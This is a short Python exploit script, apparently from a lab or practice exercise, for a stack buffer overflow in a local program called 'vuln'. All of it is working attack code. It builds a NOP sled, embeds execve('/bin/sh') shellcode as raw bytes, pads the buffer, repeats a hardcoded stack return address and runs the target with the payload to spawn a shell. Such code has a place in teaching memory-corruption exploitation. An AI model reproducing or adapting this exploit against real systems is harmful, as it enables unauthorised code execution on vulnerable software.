#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

# Stack address where shellcode is copied.
#ret_addr = 0xbffff590
ret_addr = 0xbffff450

# Spawn a shell
# execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# endianess convertion
def conv(num):
    return struct.pack("<I",num)

# overflow (buffer + stack alignment + caller's ebp)
buf = "\x90" * 200                                      # sled
buf += scode                                            # shellcode
buf += "A" * (((len(scode) + 3) & ~3) - len(scode))     # padding
buf += conv(ret_addr) * 20                              # return address range

print "Calling vulnerable program"
call(["./vuln", buf])
